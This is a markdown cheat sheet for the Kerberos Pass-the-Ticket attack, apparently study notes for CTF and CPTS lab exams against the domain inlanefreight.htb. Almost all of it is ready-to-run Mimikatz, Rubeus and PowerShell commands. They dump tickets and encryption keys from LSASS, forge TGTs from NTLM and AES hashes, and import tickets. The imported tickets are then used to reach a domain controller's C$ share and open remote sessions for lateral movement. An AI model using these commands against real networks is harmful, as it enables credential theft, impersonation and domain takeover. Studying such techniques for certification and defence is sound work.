# Pass-the-Ticket (PtT) – CTFS & CPTS

## 1. Extract Tickets

### With Mimikatz
```mimikatz
sekurlsa::tickets /export
```

### With Rubeus
```cmd
Rubeus.exe dump /nowrap
# Outputs tickets in BASE64
```

---

## 2. Extract Keys (for Forging TGTs)
Kerberos keys (AES/RC4) are encryption keys derived from a user’s password that let you forge valid Kerberos tickets without needing the plaintext password.
### With Mimikatz
```mimikatz
privilege::debug
sekurlsa::ekeys
```
extracts Kerberos encryption keys (NTLM/RC4, AES) for logged-in users directly from LSASS memory.

---

## 3. Forge TGT

### With Mimikatz (Admin required)
```mimikatz
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
→ Spawns a new `cmd.exe` in target user’s context.

### With Rubeus (No Admin required)
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2... /nowrap
```

Auto-import ticket:
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f0... /ptt
```

---

## 4. Pass-the-Ticket (PtT)

### Import with Rubeus
```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

- **Using Base64 instead of file**:
```cmd
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/Vh
```

### Convert `.kirbi` → Base64
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

### With Mimikatz
```mimikatz
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

→ Ticket successfully imported, access shares:
```cmd
dir \\DC01.inlanefreight.htb\c$
```

---

## 5. Lateral Movement with PtT

### Mimikatz
```mimikatz
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

### Rubeus (mimic runas /netonly)
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Then:
```powershell
Enter-PSSession -ComputerName DC01
whoami
hostname
```

---

# Cheat Sheet

- **Dump tickets (Mimikatz):** `sekurlsa::tickets /export`  
- **Dump tickets (Rubeus):** `Rubeus.exe dump /nowrap`  
- **Dump keys:** `sekurlsa::ekeys`  
- **Forge TGT (Mimikatz):** `sekurlsa::pth /domain:<dom> /user:<u> /ntlm:<hash>`  
- **Forge TGT (Rubeus):** `Rubeus.exe asktgt /domain:<dom> /user:<u> /aes256:<key>`  
- **Import ticket (Mimikatz):** `kerberos::ptt <ticket.kirbi>`  
- **Import ticket (Rubeus):** `Rubeus.exe ptt /ticket:<kirbi>` or `/ticket:<b64>`  
- **Remote session:** `Enter-PSSession -ComputerName <host>`